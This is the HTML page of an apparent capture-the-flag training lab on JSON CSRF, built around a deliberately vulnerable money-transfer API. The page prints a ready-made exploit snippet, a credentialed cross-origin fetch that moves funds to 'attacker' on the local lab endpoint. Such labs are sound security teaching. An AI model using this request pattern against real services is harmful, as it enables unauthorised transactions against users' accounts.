<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>JSON CSRF - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>🔄 JSON CSRF</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>This API endpoint accepts JSON POST requests for money transfers. There's no CSRF token and no origin check. Craft a cross-origin request that performs a transfer.</p>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> Transfer API</h2>
      <div class="vulnerable-form">
        <label>Transfer to:</label><input type="text" id="transferTo" value="attacker" autocomplete="off">
        <label>Amount ($):</label><input type="number" id="transferAmount" value="10000" autocomplete="off">
        <button onclick="doTransfer()" class="btn">Transfer</button>
      </div>
      <div id="transferResult" class="result-box" style="margin-top:1rem;"></div>
      <div class="code-block">// Exploit: Use fetch from another origin
// The CORS headers allow any origin!

fetch('http://localhost:3000/labs/csrf/json-csrf/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({to: 'attacker', amount: 99999})
});</div>
    </div>
    <div class="flag-submit">
      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('csrf-basic', 'flagInput_csrf3', 'flagResult_csrf3'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;">
        <input type="text" id="flagInput_csrf3" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button>
      </form>
      <div id="flagResult_csrf3" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function doTransfer() {
      const res = await fetch('/labs/csrf/json-csrf/transfer', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({to:document.getElementById('transferTo').value, amount:document.getElementById('transferAmount').value})
      });
      document.getElementById('transferResult').innerHTML = '<pre>'+JSON.stringify(await res.json(),null,2)+'</pre>';
    }
  </script>
</body>
</html>
